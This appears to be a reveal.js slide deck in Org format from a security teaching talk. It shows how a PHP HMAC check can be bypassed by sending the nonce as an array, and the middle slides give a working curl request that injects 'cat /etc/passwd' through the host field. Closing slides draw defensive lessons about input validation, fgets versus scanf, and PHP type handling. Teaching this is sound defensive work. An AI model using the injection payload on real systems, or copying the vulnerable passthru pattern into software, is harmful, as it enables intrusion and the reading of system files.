2022-02-03/Presentation.org
*** What are the arguments this bit of code expects?
#+BEGIN_SRC php
    $secret = getenv("SECRET");

    if (isset($_POST['nonce']))
        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);

    $hmac = hash_hmac('sha256', $_POST['host'], $secret);

    if ($hmac !== $_POST['hmac']) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }

    echo passthru("host ".$_POST['host']);
#+END_SRC

#+ATTR_REVEAL: :frag appear
What can we change?

#+ATTR_REVEAL: :frag (appear appear appear)
- ~hmac~
- ~host~
- ~nonce~

*** What happens to ~hash_hmac~ when we change ~$_POST['nonce']~ to an array?
#+ATTR_REVEAL: :frag appear
Let's see!

*** Commands
#+BEGIN_NOTES
[[shell:docker run -it php:7.4-apache-buster php -a]]
#+END_NOTES

#+BEGIN_SRC php
$test_value = ['1','2'];
var_dump(hash_hmac('sha256', $test_value, 'dummy'));
#+END_SRC

#+ATTR_REVEAL: :frag appear
#+BEGIN_SRC php
var_dump(hash_hmac('sha256', 'a string', NULL));
#+END_SRC

*** It works!
#+ATTR_REVEAL: :frag appear
Now what?

*** Look at the source code again...
#+BEGIN_SRC php
    $secret = getenv("SECRET");

    if (isset($_POST['nonce']))
        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);

    $hmac = hash_hmac('sha256', $_POST['host'], $secret);

    if ($hmac !== $_POST['hmac']) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }

    echo passthru("host ".$_POST['host']);
#+END_SRC

*** Resulting query
#+ATTR_REVEAL: :frag (appear appear appear appear)
- host: ~google.com;cat /etc/passwd~
- hmac: ~bbf36c444a323aca2808...~
- nonce[]: 1
- nonce[]: 2

*** Command
#+BEGIN_SRC bash
curl --data "nonce[]=1&nonce[]=2&host=google.com;cat /etc/passwd&hmac=bbf36c444a323aca2808e486ea2165ff76d6f671e5dee9987007dba448230a53" 10.104.58.39
#+END_SRC
* What can we learn from both examples?
** Assume there is a problem
#+ATTR_REVEAL: :frag appear
It makes it easier to recover when there is one

** Do not trust users!
#+ATTR_REVEAL: :frag appear
Limit user input and verify it is the right format and type

** Do not trust your programming language!
#+ATTR_REVEAL: :frag appear
Learn the ins and outs of whatever language you are using

#+ATTR_REVEAL: :frag appear
Find a place to listen to news about your language of choice

* How can we secure Example 1?
** Don't provide the option to overflow the buffer: fgets(3)
** Compare the following
#+ATTR_REVEAL: :frag appear
#+BEGIN_SRC c
int scanf(const char format, ...);
int fscanf(FILE strict stream, const char format, ...);
#+END_SRC

#+ATTR_REVEAL: :frag appear
#+BEGIN_SRC c
char *fgets(char *s, int size, FILE *stream);
#+END_SRC

#+ATTR_REVEAL: :frag appear
What's the main difference?

** Where can you find vulnerabilities and alternatives like this?
#+ATTR_REVEAL: :frag appear
DuckDuckGo and Reddit

* How can we secure Example 2?
** Do not trust the types of your variables in weakly typed languages!
For PHP: [[https://www.php.net/manual/en/ref.var.php]]
